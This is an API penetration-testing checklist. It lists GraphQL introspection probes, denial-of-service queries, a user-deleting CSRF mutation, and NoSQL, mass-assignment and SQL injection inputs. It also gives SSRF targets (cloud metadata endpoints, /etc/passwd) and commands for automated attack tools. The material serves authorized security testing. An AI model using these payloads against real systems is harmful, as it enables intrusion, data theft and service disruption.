# REST + GraphQL Deep Testing

## GraphQL Security Testing Full Checklist

### Introspection Probing (Three-level downgrade)

```graphql
# Level 1 — Standard introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — Minified introspection (Bypass WAF)
{ __schema { types { name } } }

# Level 3 — Minimal probing
{ __type(name: "Query") { name } }
```

### DoS Attack Vectors

```graphql
# Alias overloading
query { a1: __typename a2: __typename ... a100: __typename }

# Batch query overloading
[query1, query2, ..., query10]

# Circular query
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# Directive overloading
query { __typename @skip(if: false) @include(if: true) ... }
```

### Authorization Testing

```graphql
# GET mutations (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# Batch query authentication bypass
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API Deep Testing

### Method Manipulation Matrix

| Endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ Accessible | Test unauthorized creation | Test bulk overwrite | Test field injection | Test cascading deletion | Information leakage |
| /users/me | Baseline | — | Test self-privilege escalation | Test field appending | Test self-deletion | — |

### Parameter Injection

```json
// NoSQL Injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// Mass Assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// Parameter Pollution
GET /api/users?role=user&role=admin

// JSON Array Injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF Parameters: webhook_url, callback_url, avatar_url, import_url, 
                redirect_uri, file_url, proxy_url, image_url
Test: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## Automation Toolchain

### Vespasian (Traffic-driven specification generation)

```bash
# Crawl from headless browser
vespasian crawl --url https://target.com --depth 3

# Import from Burp/HAR
vespasian import --file traffic.har

# Export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM Attack Generation)

```bash
# Automatic testing based on spec
entropy --spec api-spec.yaml --live --persona all

# Five concurrent personas:
# - malicious_insider: IDOR/mass assignment/privilege escalation
# - bot_swarm: rate limit bypass/DoS/automated abuse
# - penetration_tester: injection/authentication bypass
# - impatient_consumer: race condition/error handling
# - confused_user: unexpected input/boundary testing

# CI mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-phase pipeline)

```bash
# Phase 1-3: GraphQL Recon → Exploit → Brute force
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST Abuse
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: Rate Limit Bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema Harvesting
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
